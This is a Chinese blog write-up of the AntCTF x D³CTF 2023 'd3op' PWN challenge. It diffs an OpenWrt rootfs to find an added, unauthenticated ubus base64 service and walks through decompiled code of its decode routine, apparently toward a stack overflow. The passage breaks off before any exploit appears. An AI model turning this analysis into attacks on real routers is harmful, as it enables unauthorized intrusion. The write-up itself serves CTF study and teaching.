    <content type="html"><![CDATA[<html><head></head><body><h1 id="AntCTF-x-D³CTF-2023-d3op复盘笔记"><a href="#AntCTF-x-D³CTF-2023-d3op复盘笔记" class="headerlink" title="AntCTF x D³CTF 2023 d3op复盘笔记"></a>AntCTF x D³CTF 2023 d3op复盘笔记</h1><blockquote><p>题目类型为PWN，描述如下：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">d3op</span><br><span class="line">It might take a long time to start up, please connect about 2 minutes after the gambox start.</span><br><span class="line"></span><br><span class="line">HINTS:</span><br><span class="line">May be you need to do a diff with the rootfs in attachment.</span><br></pre></td></tr></tbody></table></figure><p>题目文件：<a href="https://github.com/z1r00/ctf-pwn/blob/main/AntCTF%20x%20D%C2%B3CTF/d3op/d3op-attachment-d362854d3418636059155138fd58997c.zip">https://github.com/z1r00/ctf-pwn/blob/main/AntCTF%20x%20D%C2%B3CTF/d3op/d3op-attachment-d362854d3418636059155138fd58997c.zip</a></p></blockquote><h2 id="初步分析"><a href="#初步分析" class="headerlink" title="初步分析"></a>初步分析</h2><p>把题目给的固件进行解包，然后发现是Openwrt 22.03.3</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> _______                     ________        __</span><br><span class="line">|       |.-----.-----.-----.|  |  |  |.----.|  |_</span><br><span class="line">|   -   ||  _  |  -__|     ||  |  |  ||   _||   _|</span><br><span class="line">|_______||   __|_____|__|__||________||__|  |____|</span><br><span class="line">         |__| W I R E L E S S   F R E E D O M</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">OpenWrt 22.03.3, r20028-43d71ad93e</span><br><span class="line">-----------------------------------------------------</span><br></pre></td></tr></tbody></table></figure><p>给的HINTS是diff一下，那就再从官网上下载一个22.03.3然后diff一下，diff结果如下</p><figure class="highlight diff"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">diff: openwrt/squashfs-root/etc/TZ: No such file or directory</span><br><span class="line">Only in d3op/squashfs-root/etc/config: network</span><br><span class="line">diff: openwrt/squashfs-root/etc/localtime: No such file or directory</span><br><span class="line">diff: openwrt/squashfs-root/etc/mtab: No such file or directory</span><br><span class="line">diff: openwrt/squashfs-root/etc/ppp/resolv.conf: No such file or directory</span><br><span class="line">diff: openwrt/squashfs-root/etc/resolv.conf: No such file or directory</span><br><span class="line">diff --color -aur openwrt/squashfs-root/etc/shadow d3op/squashfs-root/etc/shadow</span><br><span class="line"><span class="comment">--- openwrt/squashfs-root/etc/shadow2023-01-03 08:24:21</span></span><br><span class="line"><span class="comment">+++ d3op/squashfs-root/etc/shadow2023-04-12 17:33:08</span></span><br><span class="line"><span class="meta">@@ -1,4 +1,4 @@</span></span><br><span class="line"><span class="deletion">-root:::0:99999:7:::</span></span><br><span class="line"><span class="addition">+root:$6$JlPmKq/ZhqQ0I6V6$B74FL6cufcnZKT4G0sUz3xNP0Pr4k7yOG2I091f2OFOmcldS2s7CPJwOcfx0r/OshYDOFKw76APIqPHBXCdXb/:19442::::::</span></span><br><span class="line"> daemon:*:0:0:99999:7:::</span><br><span class="line"> ftp:*:0:0:99999:7:::</span><br><span class="line"> network:*:0:0:99999:7:::</span><br><span class="line">diff: openwrt/squashfs-root/etc/ssl/cert.pem: No such file or directory</span><br><span class="line">Only in d3op/squashfs-root: flag</span><br><span class="line">diff: openwrt/squashfs-root/sbin/insmod: No such file or directory</span><br><span class="line">diff: openwrt/squashfs-root/sbin/lsmod: No such file or directory</span><br><span class="line">diff: openwrt/squashfs-root/sbin/modinfo: No such file or directory</span><br><span class="line">diff: openwrt/squashfs-root/sbin/modprobe: No such file or directory</span><br><span class="line">diff: openwrt/squashfs-root/sbin/rmmod: No such file or directory</span><br><span class="line">diff: openwrt/squashfs-root/usr/bin/scp: No such file or directory</span><br><span class="line">diff: openwrt/squashfs-root/usr/bin/ssh: No such file or directory</span><br><span class="line">diff: openwrt/squashfs-root/usr/bin/wget: No such file or directory</span><br><span class="line">Only in d3op/squashfs-root/usr/libexec/rpcd: base64</span><br><span class="line">diff --color -aur openwrt/squashfs-root/usr/share/rpcd/acl.d/unauthenticated.json d3op/squashfs-root/usr/share/rpcd/acl.d/unauthenticated.json</span><br><span class="line"><span class="comment">--- openwrt/squashfs-root/usr/share/rpcd/acl.d/unauthenticated.json2023-01-03 08:24:21</span></span><br><span class="line"><span class="comment">+++ d3op/squashfs-root/usr/share/rpcd/acl.d/unauthenticated.json2023-04-10 02:25:53</span></span><br><span class="line"><span class="meta">@@ -1,13 +1,17 @@</span></span><br><span class="line"> {</span><br><span class="line"><span class="deletion">-"unauthenticated": {</span></span><br><span class="line"><span class="deletion">-"description": "Access controls for unauthenticated requests",</span></span><br><span class="line"><span class="deletion">-"read": {</span></span><br><span class="line"><span class="deletion">-"ubus": {</span></span><br><span class="line"><span class="deletion">-"session": [</span></span><br><span class="line"><span class="deletion">-"access",</span></span><br><span class="line"><span class="deletion">-"login"</span></span><br><span class="line"><span class="deletion">-]</span></span><br><span class="line"><span class="deletion">-}</span></span><br><span class="line"><span class="deletion">-}</span></span><br><span class="line"><span class="deletion">-}</span></span><br><span class="line"><span class="addition">+    "unauthenticated": {</span></span><br><span class="line"><span class="addition">+        "description": "Access controls for unauthenticated requests",</span></span><br><span class="line"><span class="addition">+        "read": {</span></span><br><span class="line"><span class="addition">+            "ubus": {</span></span><br><span class="line"><span class="addition">+                "session": [</span></span><br><span class="line"><span class="addition">+                    "access",</span></span><br><span class="line"><span class="addition">+                    "login"</span></span><br><span class="line"><span class="addition">+                ],</span></span><br><span class="line"><span class="addition">+                "base64": [</span></span><br><span class="line"><span class="addition">+                    "decode",</span></span><br><span class="line"><span class="addition">+                    "encode"</span></span><br><span class="line"><span class="addition">+                ]</span></span><br><span class="line"><span class="addition">+            }</span></span><br><span class="line"><span class="addition">+        }</span></span><br><span class="line"><span class="addition">+    }</span></span><br><span class="line"> }</span><br></pre></td></tr></tbody></table></figure><p>可以看到题目多了network，和base64这两个关键的东西</p><figure class="highlight diff"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Only in d3op/squashfs-root/usr/libexec/rpcd: base64</span><br><span class="line"></span><br><span class="line"><span class="addition">+    "unauthenticated": {</span></span><br><span class="line"><span class="addition">+        "description": "Access controls for unauthenticated requests",</span></span><br><span class="line"><span class="addition">+        "read": {</span></span><br><span class="line"><span class="addition">+            "ubus": {</span></span><br><span class="line"><span class="addition">+                "session": [</span></span><br><span class="line"><span class="addition">+                    "access",</span></span><br><span class="line"><span class="addition">+                    "login"</span></span><br><span class="line"><span class="addition">+                ],</span></span><br><span class="line"><span class="addition">+                "base64": [</span></span><br><span class="line"><span class="addition">+                    "decode",</span></span><br><span class="line"><span class="addition">+                    "encode"</span></span><br><span class="line"><span class="addition">+                ]</span></span><br><span class="line"><span class="addition">+            }</span></span><br><span class="line"><span class="addition">+        }</span></span><br><span class="line"><span class="addition">+    }</span></span><br></pre></td></tr></tbody></table></figure><p>同时也得知base64是属于ubus模块</p><h3 id="ubus模块介绍"><a href="#ubus模块介绍" class="headerlink" title="ubus模块介绍"></a>ubus模块介绍</h3><ul><li>OpenWrt 提供了一个系统总线ubus，它类似于Linux桌面操作系统的d-Bus，目标是提供系统级的<strong>进程间通信（IPC）功能</strong>。ubus在设计理念上与d-Bus基本保持一致，提供了系统级总线功能，与d-Bus相比<strong>减少了系统内存占用空间</strong>，这样可以适应于嵌入式Linux操作系统的低内存和低端CPU性能的特殊环境</li><li>ubus是OpenWrt的RPC工具，是<strong>OpenWrt的微系统总线架构</strong>，是在2011年加入OpenWrt中的。为了提供各种后台进程和应用程序之间的通信机制，ubus工程被开发出来</li><li>ubus命令用于控制调试相关ubus接口，主要命令说明如下：</li></ul><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">- list [&lt;path&gt;]                        List objects</span><br><span class="line">  - call &lt;path&gt; &lt;method&gt; [&lt;message&gt;]     Call an object method</span><br><span class="line">  - listen [&lt;path&gt;...]                   Listen <span class="keyword">for</span> events</span><br><span class="line">  - send &lt;<span class="built_in">type</span>&gt; [&lt;message&gt;]              Send an event</span><br><span class="line">  - wait_for &lt;object&gt; [&lt;object&gt;...]      Wait <span class="keyword">for</span> multiple objects to appear on ubus</span><br></pre></td></tr></tbody></table></figure><p>ubus list 即可看到当前ubus中注册的接口</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">root@(none):/<span class="comment"># ubus list</span></span><br><span class="line"><span class="built_in">base64</span></span><br><span class="line">container</span><br><span class="line">dhcp</span><br><span class="line">file</span><br><span class="line">hotplug.dhcp</span><br><span class="line">hotplug.iface</span><br><span class="line">hotplug.neigh</span><br><span class="line">hotplug.net</span><br><span class="line">hotplug.ntp</span><br><span class="line">hotplug.tftp</span><br><span class="line">iwinfo</span><br><span class="line">luci</span><br><span class="line">luci-rpc</span><br><span class="line">network</span><br><span class="line">network.device</span><br><span class="line">network.interface</span><br><span class="line">network.interface.lan</span><br><span class="line">network.interface.loopback</span><br><span class="line">network.rrdns</span><br><span class="line">network.wireless</span><br><span class="line">rc</span><br><span class="line">service</span><br><span class="line">session</span><br><span class="line">system</span><br><span class="line">uci</span><br></pre></td></tr></tbody></table></figure><p>如果想要与base64进行交互的话用call，但是需要先知道base64的输入格式是什么</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@(none):/<span class="comment"># ubus -v list base64</span></span><br><span class="line"><span class="string">'base64'</span> @1e449b72</span><br><span class="line"><span class="string">"encode"</span>:{<span class="string">"input"</span>:<span class="string">"String"</span>}</span><br><span class="line"><span class="string">"decode"</span>:{<span class="string">"input"</span>:<span class="string">"String"</span>}</span><br></pre></td></tr></tbody></table></figure><p>知道了有两个方法，一个是encode和decode，调用如下</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@(none):/<span class="comment"># ubus call base64 encode '{"input" : "z1r0"}'</span></span><br><span class="line">{</span><br><span class="line"><span class="string">"output"</span>: <span class="string">"ejFyMAA="</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>可以看到z1r0被base64编码并输出出来，漏洞点大概率就出在base64这里，至此初步分析完成</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="进入encode-x2F-decode的处理逻辑的完整命令"><a href="#进入encode-x2F-decode的处理逻辑的完整命令" class="headerlink" title="进入encode/decode的处理逻辑的完整命令"></a>进入encode/decode的处理逻辑的完整命令</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">char</span> v6[<span class="number">4096</span>]; <span class="comment">// [xsp+28h] [xbp-1028h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 *specific_method; <span class="comment">// [xsp+1028h] [xbp-28h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [xsp+1030h] [xbp-20h]</span></span><br><span class="line">  __int64 *v9; <span class="comment">// [xsp+1038h] [xbp-18h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [xsp+1044h] [xbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 *method; <span class="comment">// [xsp+1048h] [xbp-8h]</span></span><br><span class="line"></span><br><span class="line">  init_base64();                                <span class="comment">// base64表</span></span><br><span class="line">  <span class="keyword">if</span> ( argc &lt;= <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  method = argv[<span class="number">1</span>];</span><br><span class="line">  <span class="keyword">if</span> ( check_method(method, <span class="string">"list"</span>) )</span><br><span class="line">  {</span><br><span class="line">    v10 = read_input(<span class="number">0</span>, v6, <span class="number">0xFFF</span>uLL);</span><br><span class="line">    v6[v10] = <span class="number">0</span>;</span><br><span class="line">    v9 = sub_402478(v6);</span><br><span class="line">    <span class="keyword">if</span> ( v9 )</span><br><span class="line">    {</span><br><span class="line">      v8 = sub_403C90(v9, <span class="string">"input"</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v8 &amp;&amp; sub_4059D0(v8) )</span><br><span class="line">      {</span><br><span class="line">        specific_method = argv[<span class="number">2</span>];</span><br><span class="line">        <span class="keyword">if</span> ( !check_method(method, <span class="string">"call"</span>) )</span><br><span class="line">        {</span><br><span class="line">          ckec(specific_method, *(v8 + <span class="number">32</span>), byte_4A2098);</span><br><span class="line">          sub_40B230(<span class="string">"{\"output\": \"%s\"}\n"</span>, byte_4A2098);</span><br><span class="line">          sub_400A10(v9);</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      {</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    uloop_init();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>主函数是参数传递逻辑，当./base64 call 的时候会进入read_input</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_422E60</span><span class="params">(<span class="type">int</span> a1, <span class="type">void</span> *a2, <span class="type">size_t</span> a3)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// x19</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v8; <span class="comment">// w3</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v9; <span class="comment">// x19</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// w2</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// w2</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( byte_4A0F78 )</span><br><span class="line">  {</span><br><span class="line">    v4 = linux_eabi_syscall(__NR_read, a1, a2, a3);</span><br><span class="line">    <span class="keyword">if</span> ( v4 &gt; <span class="number">0xFFFFFFFFFFFFF000</span>LL )</span><br><span class="line">    {</span><br><span class="line">      v10 = -v4;</span><br><span class="line">      v4 = <span class="number">-1LL</span>;</span><br><span class="line">      *(&amp;dword_4A8590 + _ReadStatusReg(ARM64_SYSREG(<span class="number">3</span>, <span class="number">3</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">2</span>))) = v10;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> v4;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    v8 = sub_444C30();</span><br><span class="line">    v9 = linux_eabi_syscall(__NR_read, a1, a2, a3);</span><br><span class="line">    <span class="keyword">if</span> ( v9 &gt; <span class="number">0xFFFFFFFFFFFFF000</span>LL )</span><br><span class="line">    {</span><br><span class="line">      v11 = -v9;</span><br><span class="line">      v9 = <span class="number">-1LL</span>;</span><br><span class="line">      *(&amp;dword_4A8590 + _ReadStatusReg(ARM64_SYSREG(<span class="number">3</span>, <span class="number">3</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">2</span>))) = v11;</span><br><span class="line">    }</span><br><span class="line">    sub_444CC0(v8);</span><br><span class="line">    <span class="keyword">return</span> v9;</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>read_input的逻辑就是可以继续输入一串数据，然后输入的数据进行一些处理之后会筛选出是否存在input，此时会进入下一个check逻辑</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ckec(specific_method, *(v8 + <span class="number">32</span>), byte_4A2098);</span><br><span class="line">sub_40B230(<span class="string">"{\"output\": \"%s\"}\n"</span>, byte_4A2098);</span><br><span class="line">sub_400A10(v9);</span><br></pre></td></tr></tbody></table></figure><p>看一下ckec</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_4064F0</span><span class="params">(<span class="type">unsigned</span> __int64 *a1, __int64 a2, __int64 a3)</span></span><br><span class="line">{</span><br><span class="line">  <span class="keyword">if</span> ( check_method(a1, <span class="string">"encode"</span>) )</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">if</span> ( !check_method(a1, <span class="string">"decode"</span>) )</span><br><span class="line">      decode(a2, a3);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    encode(a2, a3);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>所以当执行./base64 call encode/decode的时候可以正常运行到encode/decode的处理逻辑</p><p>至此，得以进入decode/encode的处理逻辑的完整命令是</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  squashfs-root ./base64 call encode</span><br><span class="line">{<span class="string">"input"</span> : <span class="string">"z1r0"</span>}</span><br><span class="line">{<span class="string">"output"</span>: <span class="string">"ejFyMAA="</span>}</span><br></pre></td></tr></tbody></table></figure><h3 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h3><p>先看一下decode</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">decode</span><span class="params">(<span class="type">char</span> *json_input, __int64 out_put)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// w0</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// w0</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// w0</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// w0</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// w0</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// w0</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// w0</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// w0</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// w0</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// w0</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// w0</span></span><br><span class="line">  <span class="type">char</span> v16[<span class="number">1028</span>]; <span class="comment">// [xsp+28h] [xbp+28h]</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// [xsp+42Ch] [xbp+42Ch]</span></span><br><span class="line">  <span class="type">int</span> v18; <span class="comment">// [xsp+430h] [xbp+430h]</span></span><br><span class="line">  <span class="type">int</span> v19; <span class="comment">// [xsp+434h] [xbp+434h]</span></span><br><span class="line">  <span class="type">int</span> v20; <span class="comment">// [xsp+438h] [xbp+438h]</span></span><br><span class="line">  <span class="type">int</span> v21; <span class="comment">// [xsp+43Ch] [xbp+43Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> size; <span class="comment">// [xsp+440h] [xbp+440h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v23; <span class="comment">// [xsp+444h] [xbp+444h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v24; <span class="comment">// [xsp+448h] [xbp+448h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> len; <span class="comment">// [xsp+44Ch] [xbp+44Ch]</span></span><br><span class="line"></span><br><span class="line">  size = sub_400300();</span><br><span class="line">  <span class="keyword">if</span> ( (size &amp; <span class="number">3</span>) != <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  len = <span class="number">3</span> * (size &gt;&gt; <span class="number">2</span>);</span><br><span class="line">  <span class="keyword">if</span> ( json_input[size - <span class="number">1</span>] == <span class="string">'='</span> )</span><br><span class="line">    --len;</span><br><span class="line">  <span class="keyword">if</span> ( json_input[size - <span class="number">2</span>] == <span class="number">61</span> )</span><br><span class="line">    --len;</span><br><span class="line">  <span class="keyword">if</span> ( out_put )</span><br><span class="line">  {</span><br><span class="line">    v24 = <span class="number">0</span>;</span><br><span class="line">    v23 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ( size &gt; v24 )</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">if</span> ( json_input[v24] == <span class="number">61</span> )</span><br><span class="line">      {</span><br><span class="line">        ++v24;</span><br><span class="line">        v3 = <span class="number">0</span>;</span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      {</span><br><span class="line">        v4 = v24++;</span><br><span class="line">        v3 = byte_4A1F98[json_input[v4]];</span><br><span class="line">      }</span><br><span class="line">      v21 = v3;</span><br><span class="line">      <span class="keyword">if</span> ( json_input[v24] == <span class="number">61</span> )</span><br><span class="line">      {</span><br><span class="line">        ++v24;</span><br><span class="line">        v5 = <span class="number">0</span>;</span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      {</span><br><span class="line">        v6 = v24++;</span><br><span class="line">        v5 = byte_4A1F98[json_input[v6]];</span><br><span class="line">      }</span><br><span class="line">      v20 = v5;</span><br><span class="line">      <span class="keyword">if</span> ( json_input[v24] == <span class="number">61</span> )</span><br><span class="line">      {</span><br><span class="line">        ++v24;</span><br><span class="line">        v7 = <span class="number">0</span>;</span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      {</span><br><span class="line">        v8 = v24++;</span><br><span class="line">        v7 = byte_4A1F98[json_input[v8]];</span><br><span class="line">      }</span><br><span class="line">      v19 = v7;</span><br><span class="line">      <span class="keyword">if</span> ( json_input[v24] == <span class="number">61</span> )</span><br><span class="line">      {</span><br><span class="line">        ++v24;</span><br><span class="line">        v9 = <span 